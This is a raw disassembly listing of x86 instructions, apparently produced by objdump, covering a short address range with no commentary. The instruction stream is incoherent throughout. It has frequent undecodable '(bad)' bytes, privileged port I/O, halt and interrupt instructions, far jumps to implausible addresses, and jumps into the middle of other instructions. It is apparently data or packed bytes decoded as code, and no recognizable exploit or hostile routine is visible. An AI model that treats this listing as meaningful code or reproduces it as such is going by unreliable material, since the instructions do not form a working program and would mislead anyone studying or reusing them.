  4296fe:	call   0xec509ef7
  429703:	push   es
  429704:	out    0xb3,eax
  429706:	lock mov al,0xcb
  429709:	xlat   BYTE PTR ds:[ebx]
  42970a:	out    0xf2,al
  42970c:	jmp    0x429704
  42970e:	rcr    esi,1
  429710:	in     eax,0xd5
  429712:	fsubp  st(2),st
  429714:	mov    edx,0xcd06f6dc
  429719:	mov    ebp,0xfd0100c4
  42971e:	add    ah,bl
  429720:	jmp    0x429705
  429722:	enter  0xc10a,0xc6
  429726:	jmp    0xedb0:0xd2f7ade0
  42972d:	retf   
  42972e:	rcl    ch,1
  429730:	shl    ah,1
  429732:	(bad)  
  429733:	loop   0x4296fd
  429735:	mov    ecx,0xe0bdfc06
  42973a:	jmp    0x42973c
  42973c:	jmp    0xefcd:0x801da08
  429743:	fldln2 
  429745:	mov    esi,0xe7b2c0ee
  42974a:	in     eax,dx
  42974b:	rcl    edi,1
  42974d:	hlt    
  42974e:	icebp  
  42974f:	jmp    0x429720
  429751:	mov    ebx,0xeeced8fc
  429756:	cld    
  429757:	ret    0xe4c7
  42975a:	neg    dl
  42975c:	rcl    edi,1
  42975e:	stc    
  42975f:	aam    0xa
  429761:	int    0xca
  429763:	shr    DWORD PTR [edi-0x3f281b09],cl
  429769:	mov    ah,0xf0
  42976b:	lds    esi,FWORD PTR [ebx-0xd280e50]
  429771:	cmc    
  429772:	(bad)  
  429774:	stc    
  429775:	int    0xd6
  429777:	sti    
  429778:	add    eax,esp
  42977a:	repz dec dl
  42977d:	vpaddd ymm5,ymm4,ymm4
  429781:	repz in eax,0x13
  429784:	mov    cl,0xf1
  429786:	shl    ebp,0xe0
  429789:	rcl    cl,cl
  42978b:	lock iret 
  42978d:	out    0xdf,al
  42978f:	int3   
  429790:	aad    0xe8
  429792:	mov    ebp,0xf1f4dadc
  429797:	pop    es
  429798:	mov    esp,0x8f90a0b
  42979d:	cli    
  42979e:	hlt    
  42979f:	in     eax,0xc4
  4297a1:	or     eax,DWORD PTR [esi]
  4297a3:	add    BYTE PTR [ebx-0x33424238],dh
  4297a9:	loope  0x429771
  4297ab:	vpsubsb xmm0,xmm4,xmm7
  4297af:	fcmovnbe st,st(3)
  4297b1:	retf   0xcde8
  4297b4:	jmp    0x98992
  4297b9:	aad    0xd2
  4297bb:	cmc    
  4297bc:	add    esp,edx
  4297be:	(bad)  
  4297c0:	fsubp  st(6),st
  4297c2:	(bad)  
  4297c4:	in     eax,dx
  4297c5:	lods   al,BYTE PTR ds:[esi]
  4297c6:	mov    esp,0xc5e0f7c6
  4297cb:	fucomi st,st(3)
  4297cd:	rep lods eax,DWORD PTR ds:[esi]
  4297cf:	call   0xea34839e
  4297d4:	add    dh,ch
  4297d6:	aad    0xcc
  4297d8:	cmc    
  4297d9:	fimul  DWORD PTR [edx]
  4297db:	repnz (bad) 
  4297dd:	(bad)  
  4297df:	add    cl,BYTE PTR [esi]
  4297e1:	add    al,ch
  4297e3:	stc    
  4297e4:	loopne 0x4297c7
  4297e6:	lods   al,BYTE PTR ds:[esi]
  4297e7:	call   0xe2f68397
  4297ec:	ror    al,cl
  4297ee:	sar    DWORD PTR [ebx-0x9042710],1
  4297f4:	into   
  4297f5:	aam    0xf8
  4297f7:	add    eax,0xde05f9db
  4297fc:	les    edi,FWORD PTR [esi-0x36241007]
  429802:	in     eax,dx
  429803:	adc    ah,dh
  429805:	mov    ebp,0xcbc7e3ea
  42980a:	loopne 0x4297d8
  42980c:	into   
  42980d:	iret   
  42980e:	out    0xd1,al
  429810:	sar    BYTE PTR [edi-0xe2e310b],1
  429816:	(bad)  
  429818:	in     eax,0x3
  42981a:	mov    ebp,0xfad5e805
  42981f:	clc    
  429820:	fisttp DWORD PTR [edi]
  429822:	add    ecx,esi
  429824:	out    dx,eax
  429825:	(bad)
  429828:	rol    ecx,cl
  42982a:	xlat   BYTE PTR ds:[ebx]
  42982b:	jmp    0xdeef:0xdedbeeb6
  429832:	(bad)  
  429834:	repz repnz add BYTE PTR [ebp-0x29030a2f],bh
  42983c:	add    eax,DWORD PTR [edx]
  42983e:	fninit 
  429840:	int    0xcc
  429842:	add    DWORD PTR [ebx],ecx
  429844:	in     eax,0xf3
  429846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429847:	mov    cl,0xcd
  429849:	mov    bl,0xea
  42984b:	not    edx
  42984d:	mov    cl,0xe6
  42984f:	enter  0xd2ef,0xbe
  429853:	iret   
  429854:	hlt    
  429855:	mov    esp,0x5fbfbb5
  42985a:	rcl    dh,cl
  42985c:	cld    
  42985d:	(bad)  
  42985e:	jmp    0xc612:0xdff90602
  429865:	lods   al,BYTE PTR ds:[esi]
  429866:	mov    bh,0xe8
  429868:	enter  0xc6ef,0xc8
  42986c:	retf   
  42986d:	in     eax,0xed
  42986f:	(bad)  
  429870:	mov    ebx,0xd4bcb4d7
  429875:	cld    
  429876:	mov    ebx,0xdedaf1d3
  42987c:	jmp    0x349905b
  429881:	inc    DWORD PTR [eax]
  429883:	retf   
  429884:	ror    al,1
  429886:	in     al,0xf3
  429888:	cmc    
  429889:	lods   eax,DWORD PTR ds:[esi]
  42988a:	lods   eax,DWORD PTR ds:[esi]
  42988b:	retf   
  42988c:	out    dx,eax
  42988d:	out    0xc4,eax
  42988f:	fidivr WORD PTR [edx-0xc241324]
  429895:	aad    0xe0
  429897:	ror    ch,cl
  429899:	repnz fld DWORD PTR ds:0x6e4e0eb
  4298a0:	stc    
  4298a1:	retf   
  4298a2:	lds    ecx,FWORD PTR [eax]
  4298a4:	(bad)
  4298a7:	mov    esi,0xa8e3ccb2
  4298ac:	loope  0x4298a7
  4298ae:	(bad)  
  4298af:	mov    ecx,0xf3fff7bd
  4298b4:	(bad)  
  4298b6:	not    al
  4298b8:	cmc    
  4298b9:	mul    eax
  4298bb:	ror    BYTE PTR [eax],1
  4298bd:	add    eax,0xf3c8feea
  4298c2:	push   es
  4298c3:	fdivr  QWORD PTR [edi-0x545b3740]
  4298c9:	shr    dh,cl
  4298cb:	(bad)  
  4298cc:	(bad)  
  4298cd:	fdiv   DWORD PTR [eax-0x13294c26]
  4298d3:	sti    
  4298d4:	mov    esi,0xdde0f8f4
  4298d9:	frndint 
  4298db:	jecxz  0x4298dc
  4298dd:	stc    
  4298de:	out    0xed,al
  4298e0:	cmc    
  4298e1:	repz jmp 0xf4016be9
  4298e7:	rol    esi,cl
  4298e9:	shl    DWORD PTR [esi-0x1193f3b],0xfd
  4298f0:	iret   
  4298f1:	jmp    0xc41993be
  4298f6:	repz push es
  4298f8:	in     eax,0xc2
  4298fa:	sti    
  4298fb:	fimul  WORD PTR [edx]
  4298fd:	call   0xff1e7fc9
  429902:	adc    cl,ah
  429904:	(bad)  
  429906:	(bad)  [esi-0x3e4c1b49]
  42990c:	mov    cl,0xd4
  42990e:	(bad)  
  429910:	std    
  429911:	cld    
  429912:	mov    ah,0xfb
  429914:	mov    ebp,0xdbbdd9d1
  429919:	mov    esi,0xd401f8c4
  42991e:	push   cs
  42991f:	out    dx,al
  429920:	dec    BYTE PTR [esp+edi*8]
  429923:	retf   0xe0bc
  429926:	(bad)  
  429927:	test   al,0xd5
  429929:	ret    
  42992a:	mov    bh,0xd2
  42992c:	lds    esi,FWORD PTR [eax-0x35464945]
  429932:	test   ah,0xb8
  429935:	iret   
  429936:	cld    
  429937:	cld    
  429938:	(bad)  
  42993a:	fadd   DWORD PTR [esi]
  42993c:	shl    ch,1
  42993e:	iret   
  42993f:	add    bh,al
  429941:	or     eax,0xebca13ec
  429946:	lock fmul st(7),st
  429949:	xlat   BYTE PTR ds:[ebx]
  42994a:	lock retf 0xf1d4
  42994e:	mov    ecx,0xdef3b9b6
  429953:	sti    
  429954:	into   
  429955:	pop    es
  429956:	repnz fst st(5)
  429959:	loop   0x42995b
  42995b:	in     eax,0xc5
  42995d:	cmc    
  42995e:	in     eax,0xd6
  429960:	lds    ecx,FWORD PTR [ebx]
  429962:	int3   
  429963:	add    edi,esp
  429965:	loopne 0x42992f
  429967:	out    0xc7,al
  429969:	jecxz  0x429952
  42996b:	shl    esi,0xb4
  42996e:	sti    
  42996f:	in     al,dx
  429970:	int    0xe4
  429972:	fcomi  st,st(2)
  429974:	rol    al,1
  429976:	call   eax
  429978:	add    eax,0xdff7f1c5
  42997d:	add    edi,edi
  42997f:	(bad)  
  429980:	in     al,dx
  429981:	enter  0xecee,0xe5
  429985:	(bad)  
  429987:	jmp    0xc33d6d78
  42998c:	in     eax,0xb7
  42998e:	imul   edi
  429990:	cld    
  429991:	(bad)  
  429992:	retf   0xc3ef
  429995:	sar    eax,cl
  429997:	ret    
  429998:	jecxz  0x429973
  42999a:	xlat   BYTE PTR ds:[ebx]
  42999b:	std    
  42999c:	add    bl,ch
  42999e:	(bad)  
  42999f:	call   0x72f9bb3
  4299a4:	mov    dl,0xa9
  4299a6:	int    0xe9
  4299a8:	ret    
  4299a9:	mov    dh,0xb5
  4299ab:	mov    edx,0xddb0ebe6
  4299b0:	iret   
  4299b1:	ror    ecx,cl
  4299b3:	sar    eax,1
  4299b5:	(bad)  
  4299b6:	out    dx,al
  4299b7:	in     al,dx
  4299b8:	lock std 
  4299ba:	fdivp  st(0),st
  4299bc:	xlat   BYTE PTR ds:[ebx]
  4299bd:	retf   
  4299be:	(bad)  
  4299bf:	in     eax,0xc8
  4299c1:	in     al,dx
  4299c2:	jmp    0xebc7:0xdda6aa0f
  4299c9:	int    0xdb
  4299cb:	(bad)  [edi-0x272d3811]
  4299d1:	shl    edx,1
  4299d3:	jmp    0xfb1d9a92
  4299d8:	mov    ebp,0xd1d207ec
  4299dd:	enter  0xae6,0xe
  4299e1:	out    0x6,al
  4299e3:	adc    edx,eax
  4299e5:	mov    cl,0xde
  4299e7:	repnz mov al,0xec
  4299ea:	shl    DWORD PTR [ebp-0x402b380a],cl
  4299f0:	fsubrp st(4),st
  4299f2:	int    0xfd
  4299f4:	mov    edx,0x7d0f3cc
  4299f9:	loope  0x4299c6
  4299fb:	div    esi
  4299fd:	idiv   edx
  4299ff:	paddq  mm5,mm1
  429a02:	jmp    0xf5f1:0xcec2e006
  429a09:	lods   eax,DWORD PTR ds:[esi]
  429a0a:	ret    
  429a0b:	enter  0xd7fa,0xd6
  429a0f:	lods   al,BYTE PTR ds:[esi]
  429a10:	mov    bh,0xfe
  429a12:	out    dx,eax
  429a13:	(bad)  
  429a14:	fstp   TBYTE PTR [eax-0x1b132506]
  429a1a:	(bad)  
  429a1b:	fdiv   st,st(6)
  429a1d:	or     ebp,eax
  429a1f:	into   
  429a20:	into   
  429a21:	or     edi,esi
  429a23:	in     eax,dx
  429a24:	(bad)  [esi-0x1e521b14]
  429a2a:	in     al,dx
  429a2b:	fnstenv [eax-0x320a2e10]
  429a31:	mov    ebp,0xe2d7d4da
  429a36:	(bad)  
  429a38:	in     al,0xc7
  429a3a:	add    al,0xfe
  429a3c:	aam    0xfa
  429a3e:	jecxz  0x429a3c
  429a40:	push   cs
  429a41:	loop   0x429a1e
  429a43:	(bad)  
  429a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a45:	fcomip st,st(1)
  429a47:	mov    cl,0xe3
  429a49:	int3   
  429a4a:	shl    BYTE PTR [edi-0x46280c33],0xec
  429a51:	(bad)  
  429a52:	mov    ebp,0xd6cfccd4
  429a57:	loope  0x429a2b
  429a59:	std    
  429a5a:	mov    ebp,0xe4fbc7
  429a5f:	fsubr  st(7),st
  429a61:	fmul   st(7),st
  429a63:	pop    es
  429a64:	mov    ebp,0xb0d1c7c1
  429a69:	repz retf 0xe8d7
  429a6d:	out    dx,al
  429a6e:	jmp    0x429a41
  429a70:	mov    edx,0xd8fcf7f5
  429a75:	in     al,dx
  429a76:	(bad)  
  429a78:	in     al,0xec
  429a7a:	rcr    ebx,0x0
  429a7d:	loopne 0x429a5d
  429a7f:	loop   0x429a8e
  429a81:	(bad)  
  429a82:	in     al,0x2
  429a84:	(bad)  
  429a85:	scas   eax,DWORD PTR es:[edi]
  429a86:	(bad)  
  429a87:	out    dx,eax
  429a88:	bnd ret 
  429a8a:	mov    dh,0xb3
  429a8c:	(bad)  
  429a8d:	iret   
  429a8e:	repnz leave 
  429a90:	rcr    ch,cl
  429a92:	mov    ebp,0xddbec3fe
  429a97:	(bad)  
  429a99:	(bad)  
  429a9a:	fld    QWORD PTR ds:0xd9bdebc2
  429aa0:	or     ebp,edi
  429aa2:	fcmovu st,st(6)
  429aa4:	ret    0xeab8
  429aa7:	repz iret 
  429aa9:	les    esi,FWORD PTR [edx-0x32371b26]
  429aaf:	mov    ch,0xb4
  429ab1:	int3   
  429ab2:	repz ret 0xc0e8
  429ab6:	fcomi  st,st(4)
  429ab8:	repz or ebx,edx
  429abb:	rcl    esp,0xe4
  429abe:	out    0x6,al
  429ac0:	or     al,0xc9
  429ac2:	add    dh,bl
  429ac4:	in     eax,0xe7
  429ac6:	(bad)  
  429ac7:	iret   
  429ac8:	mov    cl,0xb3
  429aca:	loop   0x429aad
  429acc:	loope  0x429ab2
  429ace:	(bad)  
  429ad0:	icebp  
  429ad1:	retf   
  429ad2:	rcr    esi,cl
  429ad4:	add    edx,eax
  429ad6:	stc    
  429ad7:	rol    ebp,1
  429ad9:	inc    ch
  429adb:	cld    
  429adc:	inc    esi
  429ade:	out    0xe4,eax
  429ae0:	add    al,0xf8
  429ae2:	loope  0x429ac8
  429ae4:	(bad)  
  429ae6:	loope  0x429ab9
  429ae8:	shr    ah,cl
  429aea:	in     al,0xea
  429aec:	(bad)  
  429aee:	sti    
  429aef:	aam    0xd2
  429af1:	cmc    
  429af2:	in     eax,dx
  429af3:	leave  
  429af4:	loopne 0x429af5
  429af6:	sar    dl,cl
  429af8:	fiadd  DWORD PTR [ecx]
  429afa:	vpmaxub ymm4,ymm1,ymm3
  429afe:	cli    
  429aff:	out    0xcd,eax
  429b01:	retf   
  429b02:	psrad  mm5,QWORD PTR [ebp-0x30380821]
  429b09:	hlt    
  429b0a:	in     al,0xd3
  429b0c:	loope  0x429af4
  429b0e:	(bad)  [esi-0xc320e2f]
  429b14:	fst    st(2)
  429b16:	sar    dh,0xbd
  429b19:	(bad)  
  429b1a:	fucompp 
  429b1c:	lock cmc 
  429b1e:	add    esp,ecx
  429b20:	fxch   st(1)
  429b22:	push   cs
  429b23:	(bad)  
  429b25:	jmp    0xb20f910e
  429b2a:	out    dx,al
  429b2b:	loopne 0x429af1
  429b2d:	mov    dl,0xf5
  429b2f:	fadd   st,st(5)
  429b31:	ffreep st(3)
  429b33:	(bad)  
  429b34:	out    dx,al
  429b35:	loopne 0x429b0e
  429b37:	int    0xd5
  429b39:	(bad)  
  429b3b:	add    al,0xe0
  429b3d:	lock or cl,BYTE PTR ds:0xe03e509
  429b44:	mov    edi,0xdbefeade
  429b4a:	ret    
  429b4b:	mov    ebx,0xc4cbd8f4
  429b50:	hlt    
  429b51:	in     eax,dx
  429b52:	in     eax,dx
  429b53:	(bad)  
  429b54:	(bad)  
  429b55:	repnz into 
  429b57:	add    eax,0xe1e2f9ff
  429b5c:	jecxz  0x429b55
  429b5e:	jmp    0xec276638
  429b63:	repz int 0xbd
  429b66:	leave  
  429b67:	rcl    esp,0xd0
  429b6a:	cli    
  429b6b:	div    DWORD PTR [esi-0x2e2b140b]
  429b71:	enter  0xd8dd,0x1
  429b75:	enter  0xe7f0,0xed
  429b79:	repnz (bad) 
  429b7b:	inc    ebp
  429b7d:	mov    esi,0xe7ecc4f9
  429b82:	iret   
  429b83:	out    0xb9,al
  429b85:	scas   al,BYTE PTR es:[edi]
  429b86:	loope  0x429b53
  429b88:	aam    0xb4
  429b8a:	loopne 0x429b67
  429b8c:	mov    bl,0xe9
  429b8e:	in     al,dx
  429b8f:	mov    esi,0xb4fbe9eb
  429b94:	repnz rol BYTE PTR [edx],0xfe
  429b98:	cld    
  429b99:	rol    DWORD PTR [eax],cl
  429b9b:	xlat   BYTE PTR ds:[ebx]
  429b9c:	neg    edi
  429b9e:	fcmovbe st,st(6)
  429ba0:	call   DWORD PTR [ebx]
  429ba2:	call   0xd3eb4ea1
  429ba7:	shl    cl,0xb6
  429baa:	jmp    0xf0d9:0xe9b6fbb3
  429bb1:	mov    ebx,0xcdbcdfd3
  429bb6:	out    0xe5,eax
  429bb8:	pop    es
  429bb9:	fst    st(5)
  429bbb:	loopne 0x429b93
  429bbd:	hlt    
  429bbe:	add    esp,eax
  429bc0:	or     esi,ebp
  429bc2:	repnz in eax,0xb3
  429bc5:	shr    BYTE PTR [edi-0x521f303f],cl
  429bcb:	jmp    0x429b7d
  429bcd:	mov    eax,0xb2fcb6ec
  429bd2:	mov    ebx,0xf6b9b9d9
  429bd7:	clc    
  429bd8:	div    ah
  429bda:	shl    eax,1
  429bdc:	(bad)  
  429bdd:	fxch   st(3)
  429bdf:	jecxz  0x429be3
  429be1:	jmp    0xefeb81e8
  429be6:	enter  0xefbe,0xf5
  429bea:	jmp    0x429bb3
  429bec:	loopne 0x429bd7
  429bee:	(bad)  
  429bef:	cmc    
  429bf0:	(bad)  
  429bf1:	int3   
  429bf2:	fdiv   DWORD PTR [edx+edi*8-0x400a0012]
  429bf9:	or     edx,ebp
  429bfb:	jmp    edx
  429bfd:	retf   0xf8c8
  429c00:	retf   
  429c01:	iret   
  429c02:	std    
  429c03:	int    0xaf
  429c05:	(bad)
  429c08:	jecxz  0x429bb8
  429c0a:	call   0xdef96ebb
  429c0f:	shl    ebp,1
  429c11:	sar    DWORD PTR [ebx-0x8283d0b],cl
  429c17:	loop   0x429c13
  429c19:	mov    esp,0x60bd2bc
  429c1e:	dec    BYTE PTR [edx]
  429c20:	or     al,bh
  429c22:	pop    es
  429c23:	add    eax,0xebd1aaaa
  429c28:	(bad)  
  429c29:	hlt    
  429c2a:	mov    ebx,0xb0f7faf4
  429c2f:	(bad)
  429c32:	mov    ch,0xde
  429c34:	into   
  429c35:	repz ret 0xd7fc
  429c39:	add    bl,ah
  429c3b:	add    bl,ch
  429c3d:	add    al,0xc7
  429c3f:	pop    es
  429c40:	(bad)  
  429c42:	adc    cl,dh
  429c44:	(bad)
  429c47:	int    0xdc
  429c49:	loope  0x429c42
  429c4b:	mov    ah,0xc6
  429c4d:	int    0xe8
  429c4f:	iret   
  429c50:	out    dx,eax
  429c51:	(bad)  
  429c52:	clc    
  429c53:	fcmovnu st,st(3)
  429c55:	add    esp,ebp
  429c57:	mov    ebp,0x9fefafe
  429c5c:	call   0xcb487831
  429c61:	add    ah,bl
  429c63:	into   
  429c64:	repnz in eax,dx
  429c66:	(bad)  
  429c67:	out    0xac,al
  429c69:	(bad)  
  429c6a:	cli    
  429c6b:	in     eax,0xe4
  429c6d:	out    0xf2,eax
  429c6f:	lods   al,BYTE PTR ds:[esi]
  429c70:	out    dx,eax
  429c71:	mul    bl
  429c73:	jecxz  0x429c47
  429c75:	iret   
  429c76:	(bad)  
  429c77:	mov    esp,0xded8e607
  429c7c:	loop   0x429c47
  429c7e:	clc    
  429c7f:	push   es
  429c80:	leave  
  429c81:	or     al,0xc4
  429c83:	add    edi,ebx
  429c85:	scas   al,BYTE PTR es:[edi]
  429c86:	jmp    0xc6e5:0xb1f3f2c0
  429c8d:	repnz cmc 
  429c8f:	cli    
  429c90:	in     al,dx
  429c91:	mov    dl,0xf5
  429c93:	(bad)  
  429c94:	cli    
  429c95:	(bad)  
  429c96:	in     eax,dx
  429c97:	mov    ebp,0xe7e1e7bc
  429c9c:	sti    
  429c9d:	imul   cl
  429c9f:	fsubr  st,st(1)
  429ca1:	or     ebp,eax
  429ca3:	adc    ch,BYTE PTR [esi-0x29141440]
  429ca9:	iret   
  429caa:	hlt    
  429cab:	jmp    0xd2d0:0xc4f2caaf
  429cb2:	fcomp  st(0)
  429cb4:	mov    esp,0xffbcd1d4
  429cb9:	std    
  429cba:	xlat   BYTE PTR ds:[ebx]
  429cbb:	in     al,0xd9
  429cbd:	mov    ch,0xe
  429cc0:	add    eax,esp
  429cc2:	clc    
  429cc3:	iret   
  429cc4:	out    0xf0,al
  429cc6:	mov    ebp,0xf2caf4b3
  429ccb:	loope  0x429ca1
  429ccd:	mov    ch,0xec
  429ccf:	jmp    0x429cad
  429cd1:	cmc    
  429cd2:	rcr    edi,cl
  429cd4:	mov    bh,0xda
  429cd6:	fcom   st(4)
  429cd8:	fdivr  QWORD PTR [ebp+0x4d4d4d7]
  429cde:	loopne 0x429cc9
  429ce0:	out    0xe4,al
  429ce2:	iret   
  429ce3:	int    0xc5
  429ce5:	shl    edx,0xcb
  429ce8:	loope  0x429cce
  429cea:	mov    bh,0xf6
  429cec:	int    0xf8
  429cee:	(bad)  
  429cef:	inc    esp
  429cf1:	les    edi,FWORD PTR [ebx-0xf094844]
  429cf7:	shl    ecx,cl
  429cf9:	xlat   BYTE PTR ds:[ebx]
  429cfa:	loopne 0x429ce7
  429cfc:	loope  0x429cf9
  429cfe:	loope  0x429cf5
  429d00:	or     ah,dh
  429d02:	loope  0x429d06
  429d04:	les    ebp,FWORD PTR [edx+eax*8-0x371e0a4a]
  429d0b:	icebp  
  429d0c:	shl    edi,1
  429d0e:	mov    al,0xeb
  429d10:	into   
  429d11:	in     eax,dx
  429d12:	in     al,dx
  429d13:	ror    ebp,1
  429d15:	ret    
  429d16:	cmc    
  429d17:	out    0xe1,eax
  429d19:	cli    
  429d1a:	add    eax,edx
  429d1c:	or     DWORD PTR [ebx],eax
  429d1e:	or     ch,al
  429d20:	retf   
  429d21:	in     eax,dx
  429d22:	loop   0x429d0f
  429d24:	in     eax,0xf2
  429d26:	not    eax
  429d28:	in     al,0xed
  429d2a:	mov    bl,0xba
  429d2c:	out    0xe9,eax
  429d2e:	out    0xf1,al
  429d30:	mov    ecx,0xdee9bbd8
  429d35:	icebp  
  429d36:	clc    
  429d37:	fcomp  st(5)
  429d39:	mov    BYTE PTR [eax],0xf5
  429d3c:	push   es
  429d3d:	mov    esi,0xce0ee50a
  429d42:	fninit 
  429d44:	mov    esi,0xe2b0c6d1
  429d49:	jmp    0xdecc:0xc4cbc9e2
  429d50:	leave  
  429d51:	retf   
  429d52:	(bad)  
  429d53:	mov    eax,0xcd00fdf3
  429d58:	mov    ebx,0xf4e5bc
  429d5d:	neg    edx
  429d5f:	jmp    0xc3c7:0x90cdbe8
  429d66:	out    0xd0,eax
  429d68:	shl    esi,cl
  429d6a:	int    0xce
  429d6c:	(bad)  
  429d6d:	shl    ah,1
  429d6f:	retf   0xf4d6
  429d72:	div    bh
  429d74:	idiv   DWORD PTR [ecx-0xd072b1a]
  429d7a:	rcl    eax,1
  429d7c:	cmc    
  429d7d:	aad    0xf6
  429d7f:	retf   
  429d80:	retf   
  429d81:	int    0xc1
  429d83:	(bad)  
  429d84:	mov    edi,0xacaef6d2
  429d89:	mov    ch,0xe4
  429d8b:	mov    ebx,0xc4cdc4c9
  429d90:	cmc    
  429d91:	(bad)  
  429d93:	in     eax,dx
  429d94:	in     al,dx
  429d95:	ret    0xe3da
  429d98:	add    al,0x6
  429d9a:	aam    0x7
  429d9c:	call   0xe0287f9b
  429da1:	retf   0xbfd
  429da4:	jecxz  0x429d4c
  429da6:	into   
  429da7:	out    0xf7,eax
  429da9:	mov    dh,0xce
  429dab:	out    dx,eax
  429dac:	shr    edi,1
  429dae:	enter  0xe8be,0xbb
  429db2:	repz std 
  429db4:	std    
  429db5:	aam    0xd0
  429db7:	(bad)  
  429db9:	loope  0x429db9
  429dbb:	sar    esp,1
  429dbd:	(bad)  
  429dbf:	or     cl,bl
  429dc1:	add    eax,0xcfc2e2fa
  429dc6:	out    0xd0,eax
  429dc8:	imul   edi
  429dca:	jmp    0xf0f1:0xc4f3d4cc
  429dd1:	mov    ah,0xd4
  429dd3:	ret    0xd7f8
  429dd6:	add    esi,ebp
  429dd8:	add    edx,eax
  429dda:	cmc    
  429ddb:	sti    
  429ddc:	lock in eax,0xff
  429ddf:	add    edx,ecx
  429de1:	retf   0xe500
  429de4:	out    0xf7,al
  429de6:	fmulp  st(3),st
  429de8:	out    dx,al
  429de9:	mov    ch,0xd4
  429deb:	stc    
  429dec:	cmc    
  429ded:	lock push ebp
  429df0:	jmp    0xeed9:0xefbabeef
  429df7:	idiv   DWORD PTR [ebp-0x2304f802]
  429dfd:	fld    QWORD PTR ds:0xe409fdbc
  429e03:	enter  0xe7aa,0xe7
  429e07:	icebp  
  429e08:	(bad)
  429e0b:	repz (bad) 
  429e0d:	fcomi  st,st(2)
  429e0f:	in     al,0xba
  429e11:	fcmovnb st,st(3)
  429e13:	fcmovnbe st,st(7)
  429e15:	sar    ch,0xf7
  429e18:	mov    edi,0xeacac7c7
  429e1d:	in     al,0xc1
  429e1f:	rol    BYTE PTR ds:0xafe2db02,0xaa
  429e26:	mov    bl,0xe1
  429e28:	mov    dl,0xe1
  429e2a:	jmp    0x429e03
  429e2c:	aam    0xb5
  429e2e:	(bad)  
  429e2f:	repz fxch st(5)
  429e32:	ror    edx,cl
  429e34:	add    esi,ecx
  429e36:	rol    ebx,0xe7
  429e39:	add    ecx,ebx
  429e3b:	push   es
  429e3c:	ret    
  429e3d:	enter  0xe9f7,0x1
  429e41:	add    al,0xfe
  429e43:	add    BYTE PTR [edx-0x1f57421a],ch
  429e49:	in     eax,dx
  429e4a:	shl    ebp,0xf8
  429e4d:	(bad)  
  429e4e:	mov    ch,0xe6
  429e50:	mov    edx,0xf4d8f7c4
  429e55:	test   DWORD PTR [ecx],0xe6ecfabe
  429e5b:	jmp    0xef8:0xd4090f02
  429e62:	(bad)  
  429e63:	clc    
  429e64:	icebp  
  429e65:	out    dx,al
  429e66:	(bad)  
  429e67:	jmp    0x429e4a
  429e69:	jmp    0xd00f701b
  429e6e:	fdivrp st(4),st
  429e70:	in     eax,0xde
  429e72:	xlat   BYTE PTR ds:[ebx]
  429e73:	stc    
  429e74:	shl    al,1
  429e76:	mov    esi,0xd2fd02de
  429e7b:	loopne 0x429e67
  429e7d:	out    dx,eax
  429e7e:	cli    
  429e7f:	(bad)  
  429e81:	hlt    
  429e82:	rcl    edx,0xbf
  429e85:	out    0xd2,al
  429e87:	ret    0xc1ae
  429e8a:	fcmove st,st(4)
  429e8c:	(bad)  
  429e8d:	sti    
  429e8e:	(bad)  
  429e8f:	cli    
  429e90:	icebp  
  429e91:	mov    dh,0xfb
  429e93:	fcmove st,st(1)
  429e95:	repnz icebp 
  429e97:	add    edx,edi
  429e99:	(bad)  
  429e9a:	jmp    0x429e80
  429e9c:	test   eax,0xdccabce1
  429ea2:	jmp    0xc42e91a0
  429ea7:	leave  
  429ea8:	out    dx,al
  429ea9:	mov    bh,0xf6
  429eab:	out    dx,eax
  429eac:	mov    dh,0xfb
  429eae:	(bad)  
  429eaf:	mov    dh,0xfa
  429eb1:	mov    eax,0xe3bec9f8
  429eb6:	add    BYTE PTR [ebx],al
  429eb8:	(bad)  
  429eba:	fninit 
  429ebc:	cli    
  429ebd:	lds    ecx,FWORD PTR [edi]
  429ebf:	out    0x0,al
  429ec1:	add    al,0x2
  429ec3:	ror    ah,cl
  429ec5:	fdiv   QWORD PTR [ebx-0x251b1723]
  429ecb:	repz cmc 
  429ecd:	hlt    
  429ece:	cmc    
  429ecf:	in     eax,0xb6
  429ed1:	cmc    
  429ed2:	mov    ebx,0x1c3bff9
  429ed7:	hlt    
  429ed8:	fst    st(7)
  429eda:	fadd   QWORD PTR ds:0x2f4c8ca
  429ee0:	jecxz  0x429eda
  429ee2:	sti    
  429ee3:	std    
  429ee4:	jecxz  0x429ea6
  429ee6:	lods   eax,DWORD PTR ds:[esi]
  429ee7:	jmp    0xbbf5:0xc8c9e6e2
  429eee:	sar    DWORD PTR [ebx-0xb4a060d],1
  429ef4:	fcomip st,st(2)
  429ef6:	jecxz  0x429ed7
  429ef8:	shl    dl,cl
  429efa:	fcomi  st,st(6)
  429efc:	add    edi,esi
  429efe:	test   DWORD PTR [esi+edi*8],0xaeebc1ea
  429f05:	shl    esi,1
  429f07:	retf   0xdbc2
  429f0a:	jecxz  0x429ed4
  429f0c:	icebp  
  429f0d:	lock int3 
  429f0f:	repz aam 0xdc
  429f12:	repz add ecx,edi
  429f15:	hlt    
  429f16:	rcl    bh,0xf6
  429f19:	jmp    0x429f11
  429f1b:	cli    
  429f1c:	out    0xfd,eax
  429f1e:	(bad)  
  429f1f:	(bad)  
  429f20:	fld    QWORD PTR ds:0xf7e11208
  429f26:	mov    cl,0xb7
  429f28:	aad    0xd5
  429f2a:	mov    ebx,0xb8c7f3db
  429f2f:	clc    
  429f30:	cli    
  429f31:	mov    dh,0xd4
  429f33:	(bad)  
  429f34:	hlt    
  429f35:	out    dx,al
  429f36:	in     al,dx
  429f37:	add    dl,ah
  429f39:	fld    QWORD PTR [ecx]
  429f3b:	or     ecx,ecx
  429f3d:	mov    DWORD PTR [esp+eax*8],0x8c5f9c5
  429f44:	rcr    edi,1
  429f46:	out    dx,al
  429f47:	retf   
  429f48:	ret    
  429f49:	ret    0xc4bb
  429f4c:	mov    edx,0xd3baebdb
  429f51:	mov    esi,0xbfbadab9
  429f56:	add    cl,bl
  429f58:	add    bh,dl
  429f5a:	ret    0xebe7
  429f5d:	jmp    0xe51ca365
  429f62:	(bad)
  429f65:	in     al,0xc3
  429f67:	jecxz  0x429f37
  429f69:	hlt    
  429f6a:	mov    dl,0xe1
  429f6c:	neg    dl
  429f6e:	rcr    eax,1
  429f70:	enter  0xc9bb,0xce
  429f74:	lock (bad) 
  429f76:	cli    
  429f77:	ffree  st(0)
  429f79:	int3   
  429f7a:	cli    
  429f7b:	add    bh,BYTE PTR [edi-0x2026fb18]
  429f81:	add    eax,0xe1f1e7ef
  429f86:	ret    
  429f87:	lods   eax,DWORD PTR ds:[esi]
